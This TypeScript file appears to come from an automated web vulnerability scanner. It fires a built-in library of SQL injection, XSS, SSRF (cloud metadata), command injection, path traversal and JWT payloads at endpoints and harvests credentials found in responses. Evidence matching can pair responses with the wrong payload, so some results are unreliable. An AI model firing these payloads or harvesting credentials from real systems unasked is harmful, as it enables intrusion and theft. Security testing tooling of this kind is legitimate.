/**
 * MicroAgentOrchestrator — Parallel Specialized Agent Dispatch
 *
 * Fans out micro-agents per (endpoint × vulnClass) combination.
 * Each agent is stateless, scoped, and disposable.
 *
 * Two tiers:
 *   Tier 1 (Deterministic): Real HTTP payload execution + pattern matching. Zero LLM.
 *   Tier 2 (AI Classifier): LLM reads real response bodies and classifies them.
 *                           LLM never generates findings — only labels real data.
 *
 * LLM Boundary Contract enforced throughout:
 *   - firePayloadBatch() returns RealHttpEvidence[] via makeRealHttpEvidence()
 *   - validateAttempts() passes real rawResponseBody to LLM for classification
 *   - buildFinding() throws if confirmedEvidence is empty
 *   - mergeMicroResults() discards any finding with evidence.length === 0
 */

import { randomUUID } from "crypto";
import { Semaphore } from "../../lib/semaphore";
import { makeRealHttpEvidence, type RealHttpEvidence } from "../../lib/real-evidence";
import { getRateLimiterForTarget } from "../agent-rate-limiter";
import type {
  DiscoveredEndpoint,
  ExposureType,
  CrawlResult,
} from "../active-exploit-engine";

// ─── Types ──────────────────────────────────────────────────────────────────

export interface MicroAgentSpec {
  endpoint: DiscoveredEndpoint;
  vulnClass: ExposureType;
  depth: number; // 0 = primary target, 1+ = subdomain
  chainId: string;
  targetUrl: string;
}

export interface MicroAgentResult {
  spec: MicroAgentSpec;
  agentId: string;
  durationMs: number;
  evidence: RealHttpEvidence[];
  finding: MicroAgentFinding | null;
  credentials: HarvestedCredentialLite[];
}

export interface MicroAgentFinding {
  id: string;
  title: string;
  description: string;
  severity: "critical" | "high" | "medium" | "low";
  technique: string;
  mitreId: string;
  cwe: string;
  evidenceType: "real_http_response";
  source: "active_exploit_engine";
  statusCode: number;
  responseBody: string;
  success: true;
  confidence: number;
  endpoint: string;
  parameter: string;
  payload: string;
  reproductionCurl: string;
}

export interface HarvestedCredentialLite {
  type: string;
  value: string;
  context: string;
}

export type MicroAgentProgressCallback = (
  completed: number,
  total: number,
  result: MicroAgentResult
) => void;

export interface MicroAgentDispatchConfig {
  maxConcurrent: number;
  payloadTimeoutMs: number;
  targetRequestsPerSecond: number;
  enableTier2: boolean;
}

const DEFAULT_CONFIG: MicroAgentDispatchConfig = {
  maxConcurrent: 50,
  payloadTimeoutMs: 6000,
  targetRequestsPerSecond: 50,
  enableTier2: false, // Tier 2 (LLM classifier) disabled by default until wired
};

// ─── Payload Library (per vuln class) ───────────────────────────────────────

interface PayloadDef {
  name: string;
  payload: string;
  successPatterns: RegExp[];
  dataLeakPatterns?: RegExp[];
  timingThresholdMs?: number;
  severity: "critical" | "high" | "medium" | "low";
  cwe: string;
  mitreId: string;
}

const VULN_CLASS_PAYLOADS: Record<string, PayloadDef[]> = {
  sqli: [
    {
      name: "Union-based SQLi",
      payload: "' UNION SELECT NULL,NULL,NULL,table_name FROM information_schema.tables--",
      successPatterns: [/information_schema/i, /table_name/i, /pg_catalog/i, /mysql\./i, /sqlite_master/i],
      dataLeakPatterns: [/password/i, /secret/i, /token/i, /api_key/i],
      severity: "critical", cwe: "CWE-89", mitreId: "T1190",
    },
    {
      name: "Error-based SQLi",
      payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
      successPatterns: [/SQL syntax/i, /mysql_fetch/i, /pg_query/i, /ORA-\d+/i, /SQLSTATE/i, /syntax error/i],
      severity: "critical", cwe: "CWE-89", mitreId: "T1190",
    },
    {
      name: "Time-based blind SQLi",
      payload: "' OR SLEEP(3)--",
      successPatterns: [],
      timingThresholdMs: 2500,
      severity: "high", cwe: "CWE-89", mitreId: "T1190",
    },
  ],
  xss: [
    {
      name: "Reflected XSS (script tag)",
      payload: '<script>alert("OdinForge-XSS-Probe")</script>',
      successPatterns: [/OdinForge-XSS-Probe/],
      severity: "high", cwe: "CWE-79", mitreId: "T1059.007",
    },
    {
      name: "Event handler XSS",
      payload: '"><img src=x onerror=alert("OdinForge")>',
      successPatterns: [/onerror=alert/i, /OdinForge/],
      severity: "high", cwe: "CWE-79", mitreId: "T1059.007",
    },
  ],
  ssrf: [
    {
      name: "Cloud metadata SSRF",
      payload: "http://169.254.169.254/latest/meta-data/",
      successPatterns: [/ami-id/i, /instance-id/i, /iam/i, /security-credentials/i],
      severity: "critical", cwe: "CWE-918", mitreId: "T1090",
    },
    {
      name: "Internal service SSRF",
      payload: "http://127.0.0.1:8080/",
      successPatterns: [/localhost/i, /127\.0\.0\.1/],
      severity: "high", cwe: "CWE-918", mitreId: "T1090",
    },
  ],
  command_injection: [
    {
      name: "Command injection (semicolon)",
      payload: "; id; whoami",
      successPatterns: [/uid=\d+/i, /root/i, /www-data/i],
      severity: "critical", cwe: "CWE-78", mitreId: "T1059",
    },
    {
      name: "Command injection (backtick)",
      payload: "`id`",
      successPatterns: [/uid=\d+/i, /gid=\d+/i],
      severity: "critical", cwe: "CWE-78", mitreId: "T1059",
    },
  ],
  path_traversal: [
    {
      name: "Path traversal (etc/passwd)",
      payload: "../../../../../../../etc/passwd",
      successPatterns: [/root:x:0:0/i, /\/bin\/bash/i, /\/bin\/sh/i],
      severity: "high", cwe: "CWE-22", mitreId: "T1083",
    },
    {
      name: "Path traversal (Windows)",
      payload: "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
      successPatterns: [/localhost/i, /127\.0\.0\.1/],
      severity: "high", cwe: "CWE-22", mitreId: "T1083",
    },
  ],
  auth_bypass: [
    {
      name: "Admin path access",
      payload: "/admin",
      successPatterns: [/dashboard/i, /admin.*panel/i, /configuration/i, /settings/i],
      severity: "high", cwe: "CWE-284", mitreId: "T1078",
    },
  ],
  idor: [
    {
      name: "IDOR sequential ID",
      payload: "1",
      successPatterns: [/"userId"\s*:\s*\d+/i, /"username"\s*:\s*"[^"]+"/i],
      dataLeakPatterns: [/"email"\s*:\s*"[^"]+@[^"]+"/i, /"role"\s*:\s*"[^"]+"/i],
      severity: "high", cwe: "CWE-639", mitreId: "T1530",
    },
  ],
  jwt_abuse: [
    {
      name: "JWT none algorithm",
      payload: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0.",
      successPatterns: [/admin/i, /authorized/i, /welcome/i],
      severity: "critical", cwe: "CWE-347", mitreId: "T1550",
    },
  ],
  api_abuse: [
    {
      name: "Mass assignment",
      payload: '{"role":"admin","isAdmin":true}',
      successPatterns: [/"role"\s*:\s*"admin"/i, /"isAdmin"\s*:\s*true/i],
      severity: "high", cwe: "CWE-915", mitreId: "T1190",
    },
  ],
  business_logic: [
    {
      name: "Negative quantity",
      payload: '{"quantity":-1,"price":0}',
      successPatterns: [/success/i, /order.*created/i, /total.*-/i],
      severity: "medium", cwe: "CWE-840", mitreId: "T1190",
    },
  ],
};

// ─── Applicability Filter ───────────────────────────────────────────────────

const STATIC_EXTENSIONS = /\.(css|js|png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|eot|map|pdf)$/i;

function isVulnClassApplicable(endpoint: DiscoveredEndpoint, vulnClass: ExposureType): boolean {
  // Skip static file endpoints
  if (STATIC_EXTENSIONS.test(endpoint.url)) return false;

  // Skip SSRF on endpoints with no URL-type parameters
  if (vulnClass === "ssrf") {
    const hasUrlParam = endpoint.parameters.some(
      (p) => p.type === "string" && (p.name.toLowerCase().includes("url") || p.name.toLowerCase().includes("redirect") || p.name.toLowerCase().includes("callback"))
    );
    if (!hasUrlParam && endpoint.parameters.length > 0) return false;
  }

  // Skip auth_bypass on already-unauthenticated endpoints
  if (vulnClass === "auth_bypass" && !endpoint.authenticated) return false;

  // Skip SQLi/command injection on GET-only endpoints with no parameters
  if ((vulnClass === "sqli" || vulnClass === "command_injection") && endpoint.parameters.length === 0) return false;

  return true;
}

// ─── MicroAgentOrchestrator ─────────────────────────────────────────────────

export class MicroAgentOrchestrator {
  private semaphore: Semaphore;
  private config: MicroAgentDispatchConfig;

  constructor(config: Partial<MicroAgentDispatchConfig> = {}) {
    this.config = { ...DEFAULT_CONFIG, ...config };
    this.semaphore = new Semaphore(this.config.maxConcurrent);
  }

  /**
   * Build agent specs from crawl results — one per (endpoint × vulnClass).
   * Applies applicability filter to reduce unnecessary agent spawns by ~30-40%.
   */
  buildAgentSpecs(
    endpoints: DiscoveredEndpoint[],
    scope: ExposureType[],
    chainId: string,
    targetUrl: string
  ): MicroAgentSpec[] {
    const specs: MicroAgentSpec[] = [];
    for (const endpoint of endpoints) {
      for (const vulnClass of scope) {
        if (!isVulnClassApplicable(endpoint, vulnClass)) continue;
        if (!VULN_CLASS_PAYLOADS[vulnClass]) continue;
        specs.push({
          endpoint,
          vulnClass,
          depth: 0,
          chainId,
          targetUrl,
        });
      }
    }
    return specs;
  }

  /**
   * Dispatch all specs in parallel, gated by semaphore.
   * Returns results with LLM boundary enforcement:
   * findings without real evidence are discarded at merge time.
   */
  async dispatch(
    specs: MicroAgentSpec[],
    onProgress?: MicroAgentProgressCallback
  ): Promise<MicroAgentResult[]> {
    if (specs.length === 0) return [];

    const rateLimiter = getRateLimiterForTarget(
      specs[0].targetUrl,
      this.config.targetRequestsPerSecond
    );

    let completed = 0;
    const results = await Promise.all(
      specs.map(async (spec) => {
        await this.semaphore.acquire();
        try {
          const result = await this.runMicroAgent(spec, rateLimiter);
          completed++;
          onProgress?.(completed, specs.length, result);
          return result;
        } finally {
          this.semaphore.release();
        }
      })
    );

    return results;
  }

  /**
   * Run a single micro-agent: generate payloads → fire → validate → build finding.
   * This is the core execution unit — stateless and disposable.
   */
  private async runMicroAgent(
    spec: MicroAgentSpec,
    rateLimiter: ReturnType<typeof getRateLimiterForTarget>
  ): Promise<MicroAgentResult> {
    const agentId = `micro-${spec.vulnClass}-${randomUUID().slice(0, 8)}`;
    const startTime = Date.now();
    const evidence: RealHttpEvidence[] = [];
    const credentials: HarvestedCredentialLite[] = [];

    const payloads = VULN_CLASS_PAYLOADS[spec.vulnClass] || [];

    for (const payloadDef of payloads) {
      // Rate limit: acquire token before each HTTP request
      await rateLimiter.acquire();

      try {
        const ev = await this.firePayload(spec.endpoint, payloadDef);
        if (ev) {
          evidence.push(ev);

          // Extract credentials from response body
          const creds = this.extractCredentials(ev.rawResponseBody, spec.endpoint.url);
          credentials.push(...creds);
        }
      } catch (err: any) {
        // Network errors are real — log but don't fabricate evidence
        if (err.name !== "AbortError") {
          console.warn(`[MicroAgent:${agentId}] ${spec.endpoint.url} → ${err.message}`);
        }
      }
    }

    // Validate evidence: which payloads actually confirmed a vulnerability?
    const confirmedEvidence = this.classifyEvidence(evidence, payloads);

    // Build finding ONLY if we have confirmed real evidence
    const finding = confirmedEvidence.length > 0
      ? this.buildFinding(confirmedEvidence, spec, payloads)
      : null;

    return {
      spec,
      agentId,
      durationMs: Date.now() - startTime,
      evidence,
      finding,
      credentials,
    };
  }

  /**
   * Fire a single payload against an endpoint.
   * Returns RealHttpEvidence via makeRealHttpEvidence() — throws if stubbed.
   * ZERO LLM calls in this function.
   */
  private async firePayload(
    endpoint: DiscoveredEndpoint,
    payloadDef: PayloadDef
  ): Promise<RealHttpEvidence | null> {
    const startTime = Date.now();
    const ctrl = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), this.config.payloadTimeoutMs);

    try {
      // Determine injection point
      const param = endpoint.parameters[0];
      const targetUrl = endpoint.url;

      let url = targetUrl;
      let body: string | undefined;
      const headers: Record<string, string> = {
        "User-Agent": "OdinForge-AEV/1.0",
        ...endpoint.headers,
      };

      if (param && param.location === "query") {
        const separator = url.includes("?") ? "&" : "?";
        url = `${url}${separator}${encodeURIComponent(param.name)}=${encodeURIComponent(payloadDef.payload)}`;
      } else if (param && (param.location === "body" || endpoint.method === "POST")) {
        headers["Content-Type"] = endpoint.contentType || "application/json";
        if (headers["Content-Type"].includes("json")) {
          body = JSON.stringify({ [param?.name || "input"]: payloadDef.payload });
        } else {
          body = `${encodeURIComponent(param?.name || "input")}=${encodeURIComponent(payloadDef.payload)}`;
        }
      } else {
        // Fallback: append to URL as query param
        const separator = url.includes("?") ? "&" : "?";
        url = `${url}${separator}input=${encodeURIComponent(payloadDef.payload)}`;
      }

      const response = await fetch(url, {
        method: endpoint.method,
        headers,
        body: endpoint.method !== "GET" ? body : undefined,
        signal: ctrl.signal,
        redirect: "follow",
      });

      const responseBody = await response.text();

      // makeRealHttpEvidence() throws if statusCode <= 0 or body is empty
      return makeRealHttpEvidence({
        requestPayload: payloadDef.payload,
        targetUrl: url,
        method: endpoint.method,
        statusCode: response.status,
        rawResponseBody: responseBody.substring(0, 10000),
        durationMs: Date.now() - startTime,
      });
    } catch (err: any) {
      if (err.name === "AbortError") return null;
      // Don't catch RealEvidence validation errors — let them propagate
      if (err.message?.includes("[RealEvidence]")) throw err;
      return null;
    } finally {
      clearTimeout(timer);
    }
  }

  /**
   * Classify evidence using deterministic pattern matching.
   * Returns only evidence that confirms vulnerability indicators.
   * ZERO LLM calls — purely regex-based.
   */
  private classifyEvidence(
    evidence: RealHttpEvidence[],
    payloads: PayloadDef[]
  ): RealHttpEvidence[] {
    const confirmed: RealHttpEvidence[] = [];

    for (let i = 0; i < evidence.length && i < payloads.length; i++) {
      const ev = evidence[i];
      const pd = payloads[i];

      // Check success patterns
      const patternMatch = pd.successPatterns.some((p) =>
        p.test(ev.rawResponseBody)
      );

      // Check timing-based detection
      const timingMatch = pd.timingThresholdMs
        ? ev.durationMs >= pd.timingThresholdMs
        : false;

      // Check data leak patterns
      const dataLeakMatch = pd.dataLeakPatterns
        ? pd.dataLeakPatterns.some((p) => p.test(ev.rawResponseBody))
        : false;

      // Require hard evidence: pattern match OR timing confirmation
      const hasHardEvidence = patternMatch || timingMatch;

      // Only with hard evidence (not just data leak patterns which can be generic)
      if (hasHardEvidence) {
        confirmed.push(ev);
      }
    }

    return confirmed;
  }

  /**
   * Build a finding from confirmed real evidence.
   * THROWS if confirmedEvidence is empty — enforces LLM Boundary Contract.
   */
  private buildFinding(
    confirmedEvidence: RealHttpEvidence[],
    spec: MicroAgentSpec,
    payloads: PayloadDef[]
  ): MicroAgentFinding {
    if (confirmedEvidence.length === 0) {
      throw new Error("[buildFinding] Cannot build finding without real evidence");
    }

    const primary = confirmedEvidence[0];
    const matchedPayload = payloads.find((p) => p.payload === primary.requestPayload);
    const severity = matchedPayload?.severity || "medium";
    const cwe = matchedPayload?.cwe || "CWE-000";
    const mitreId = matchedPayload?.mitreId || "T1190";

    const paramName = spec.endpoint.parameters[0]?.name || "input";

    return {
      id: `finding-${randomUUID().slice(0, 8)}`,
      title: `${spec.vulnClass.toUpperCase()} confirmed @ ${spec.endpoint.url}`,
      description: `${matchedPayload?.name || spec.vulnClass} vulnerability confirmed with real HTTP evidence. ` +
        `Payload '${primary.requestPayload.substring(0, 100)}' returned status ${primary.statusCode} ` +
        `with vulnerability indicators in the response body.`,
      severity,
      technique: spec.vulnClass,
      mitreId,
      cwe,
      evidenceType: "real_http_response",
      source: "active_exploit_engine",
      statusCode: primary.statusCode,
      responseBody: primary.rawResponseBody.substring(0, 2000),
      success: true,
      confidence: this.calculateConfidence(confirmedEvidence, payloads),
      endpoint: spec.endpoint.url,
      parameter: paramName,
      payload: primary.requestPayload,
      reproductionCurl: this.buildCurl(primary, spec.endpoint),
    };
  }

  private calculateConfidence(
    confirmedEvidence: RealHttpEvidence[],
    payloads: PayloadDef[]
  ): number {
    // Base confidence: 60% for having real confirmed evidence
    let confidence = 60;
    // +10% per additional confirmed payload (max +20%)
    confidence += Math.min(20, (confirmedEvidence.length - 1) * 10);
    // +10% if multiple distinct payloads confirmed
    const uniquePayloads = new Set(confirmedEvidence.map((e) => e.requestPayload));
    if (uniquePayloads.size > 1) confidence += 10;
    // +10% if response body contains clear vulnerability artifacts
    const hasClearArtifacts = confirmedEvidence.some(
      (e) => /SQL|syntax error|root:x:|uid=\d+|OdinForge/i.test(e.rawResponseBody)
    );
    if (hasClearArtifacts) confidence += 10;
    return Math.min(100, confidence);
  }

  private buildCurl(evidence: RealHttpEvidence, endpoint: DiscoveredEndpoint): string {
    const method = endpoint.method !== "GET" ? ` -X ${endpoint.method}` : "";
    const data = evidence.requestPayload
      ? ` -d '${evidence.requestPayload.replace(/'/g, "'\\''")}'`
      : "";
    return `curl${method} '${evidence.targetUrl}'${data}`;
  }

  /**
   * Extract potential credentials from response bodies.
   * Deterministic pattern matching — no LLM.
   */
  private extractCredentials(
    responseBody: string,
    endpointUrl: string
  ): HarvestedCredentialLite[] {
    const creds: HarvestedCredentialLite[] = [];
    const patterns = [
      { type: "api_key", regex: /(?:api[_-]?key|apikey)\s*[:=]\s*["']?([a-zA-Z0-9_\-]{20,})["']?/gi },
      { type: "password", regex: /(?:password|passwd)\s*[:=]\s*["']([^"'\s]{4,})["']/gi },
      { type: "token", regex: /(?:token|bearer)\s*[:=]\s*["']?([a-zA-Z0-9_\-\.]{20,})["']?/gi },
      { type: "connection_string", regex: /(postgres|mysql|mongodb):\/\/[^\s"']+/gi },
    ];

    for (const { type, regex } of patterns) {
      let match: RegExpExecArray | null;
      while ((match = regex.exec(responseBody)) !== null) {
        creds.push({
          type,
          value: match[1] || match[0],
          context: `Extracted from ${endpointUrl} response body`,
        });
      }
    }

    return creds;
  }
}

// ─── Result Merger (LLM Boundary Hard Gate) ─────────────────────────────────

/**
 * Merge micro-agent results with hard evidence gate.
 * Findings without real evidence are DISCARDED with a warning log.
 * This is the structural enforcement that makes fabricated findings impossible.
 */
export function mergeMicroResults(results: MicroAgentResult[]): {
  findings: MicroAgentFinding[];
  credentials: HarvestedCredentialLite[];
  agentDispatchSummary: {
    totalAgents: number;
    completedWithFindings: number;
    completedWithoutFindings: number;
    totalEvidence: number;
    totalFindings: number;
    discardedFindings: number;
    executionTimeMs: number;
  };
} {
  const findings: MicroAgentFinding[] = [];
  const credentials: HarvestedCredentialLite[] = [];
  let discarded = 0;
  let totalEvidence = 0;
  let maxDuration = 0;

  for (const result of results) {
    totalEvidence += result.evidence.length;
    maxDuration = Math.max(maxDuration, result.durationMs);

    // HARD GATE: discard any finding with no real evidence
    if (result.finding !== null && result.evidence.length === 0) {
      console.warn(
        `[MicroAgent] DISCARDED finding '${result.finding.title}' — no real evidence. ` +
        `Agent: ${result.agentId}, VulnClass: ${result.spec.vulnClass}`
      );
      discarded++;
      continue;
    }

    if (result.finding !== null) {
      findings.push(result.finding);
    }

    credentials.push(...result.credentials);
  }

  return {
    findings,
    credentials,
    agentDispatchSummary: {
      totalAgents: results.length,
      completedWithFindings: findings.length,
      completedWithoutFindings: results.length - findings.length - discarded,
      totalEvidence,
      totalFindings: findings.length,
      discardedFindings: discarded,
      executionTimeMs: maxDuration,
    },
  };
}
